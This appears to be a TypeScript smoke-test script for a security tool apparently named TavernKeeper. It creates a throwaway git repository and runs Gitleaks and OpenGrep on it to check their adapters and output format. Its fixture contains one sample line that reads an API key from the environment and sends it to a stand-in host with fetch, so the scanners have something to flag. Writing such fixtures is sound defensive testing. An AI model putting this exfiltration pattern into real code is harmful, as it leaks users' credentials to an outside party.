import { execFile } from "node:child_process";
import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { promisify } from "node:util";
import { fileURLToPath } from "node:url";

import { safeCliErrorRecord } from "../src/cli/io.js";
import { loadScannerPins } from "../src/config/policy.js";
import {
  ProcessCommandRunner,
  restrictedEnvironment,
} from "../src/process/command-runner.js";
import { runGitleaks } from "../src/scanners/gitleaks.js";
import { OpenGrepReportSchema, runOpenGrep } from "../src/scanners/opengrep.js";
import { resolveToolsDirectory } from "./verify-scanners.mjs";

const execFileAsync = promisify(execFile);
const scriptPath = fileURLToPath(import.meta.url);
const repositoryRoot = resolve(dirname(scriptPath), "..");

async function git(root: string, args: string[]) {
  return execFileAsync("git", args, {
    cwd: root,
    env: {
      PATH: process.env.PATH,
      GIT_CONFIG_NOSYSTEM: "1",
      GIT_TERMINAL_PROMPT: "0",
    },
    timeout: 30_000,
    windowsHide: true,
  });
}

async function main() {
  if (process.platform !== "linux" || process.arch !== "x64")
    throw new Error("Scanner adapter smoke testing requires Linux x64.");
  const pins = await loadScannerPins(
    join(repositoryRoot, "config", "scanners.v1.json"),
  );
  const toolsDir = resolveToolsDirectory();
  const fixture = await mkdtemp(join(tmpdir(), "tavernkeeper-scanner-smoke-"));
  try {
    await mkdir(join(fixture, "src"));
    await writeFile(
      join(fixture, "src", "index.js"),
      [
        "const credential = process.env.API_KEY;",
        'fetch("https://example.invalid/report", { body: credential });',
        "",
      ].join("\n"),
    );
    await git(fixture, ["init", "--quiet"]);
    await git(fixture, ["config", "user.name", "TavernKeeper CI"]);
    await git(fixture, ["config", "user.email", "ci@invalid.example"]);
    await git(fixture, ["add", "--", "src/index.js"]);
    await git(fixture, ["commit", "--quiet", "-m", "scanner fixture"]);
    const targetSha = (await git(fixture, ["rev-parse", "HEAD"])).stdout.trim();
    const runner = new ProcessCommandRunner();

    const gitleaks = await runGitleaks({
      root: fixture,
      history: { baseSha: null, targetSha, commits: 1 },
      runner,
      executable: join(toolsDir, "bin", "gitleaks"),
      version: pins.gitleaks.version,
      temporaryRoot: join(toolsDir, "tmp"),
    });
    process.stdout.write(
      `Scanner adapter smoke passed: ${gitleaks.name} (${gitleaks.findings.length} findings).\n`,
    );

    const rulesRoot = join(repositoryRoot, "rules", "opengrep");
    const probe = await runner.run(
      join(toolsDir, "bin", "opengrep"),
      [
        "scan",
        "--json",
        "--disable-version-check",
        "--disable-nosem",
        "--no-git-ignore",
        "--x-ignore-semgrepignore-files",
        "--no-rewrite-rule-ids",
        "--exclude=.git",
        "--config",
        rulesRoot,
        fixture,
      ],
      {
        cwd: fixture,
        environment: restrictedEnvironment({
          NO_COLOR: "1",
          SEMGREP_SEND_METRICS: "off",
        }),
        timeoutMs: 600_000,
        maxOutputBytes: 50_000_000,
        shell: false,
      },
    );
    if (!probe.ok) throw new Error("OpenGrep shape probe could not run.");
    const value = JSON.parse(probe.value.stdout) as unknown;
    const record =
      value !== null && typeof value === "object" && !Array.isArray(value)
        ? (value as Record<string, unknown>)
        : {};
    const results = Array.isArray(record.results) ? record.results : [];
    const first =
      results[0] !== null &&
      typeof results[0] === "object" &&
      !Array.isArray(results[0])
        ? (results[0] as Record<string, unknown>)
        : {};
    const extra =
      first.extra !== null &&
      typeof first.extra === "object" &&
      !Array.isArray(first.extra)
        ? (first.extra as Record<string, unknown>)
        : {};
    const metadata =
      extra.metadata !== null &&
      typeof extra.metadata === "object" &&
      !Array.isArray(extra.metadata)
        ? (extra.metadata as Record<string, unknown>)
        : {};
    const positionType = (position: unknown) => {
      if (position === null || typeof position !== "object")
        return typeof position;
      return typeof (position as Record<string, unknown>).line;
    };
    process.stdout.write(
      `OpenGrep output shape: ${JSON.stringify({
        exitCode: probe.value.exitCode,
        topLevel: Object.keys(record).sort(),
        results: Array.isArray(record.results)
          ? record.results.length
          : typeof record.results,
        errors: Array.isArray(record.errors)
          ? record.errors.length
          : typeof record.errors,
        first: {
          check_id: typeof first.check_id,
          path: typeof first.path,
          start_line: positionType(first.start),
          end_line: positionType(first.end),
          metadata: Object.fromEntries(
            [
              "tavernkeeper_category",
              "tavernkeeper_severity",
              "tavernkeeper_confidence",
              "tavernkeeper_title",
            ].map((key) => [key, typeof metadata[key]]),
          ),
        },
      })}\n`,
    );
    const parsedShape = OpenGrepReportSchema.safeParse(value);
    if (!parsedShape.success)
      process.stdout.write(
        `OpenGrep schema issues: ${JSON.stringify(
          parsedShape.error.issues.slice(0, 10).map((issue) => ({
            code: issue.code,
            path: issue.path,
          })),
        )}\n`,
      );

    const opengrep = await runOpenGrep({
      root: fixture,
      rulesRoot,
      runner,
      executable: join(toolsDir, "bin", "opengrep"),
      version: pins.opengrep.version,
    });
    process.stdout.write(
      `Scanner adapter smoke passed: ${opengrep.name} (${opengrep.findings.length} findings).\n`,
    );
  } finally {
    await rm(fixture, { recursive: true, force: true });
  }
}

if (process.argv[1] && resolve(process.argv[1]) === scriptPath) {
  main().catch((error: unknown) => {
    process.stderr.write(`${JSON.stringify(safeCliErrorRecord(error))}\n`);
    process.exitCode = 1;
  });
}
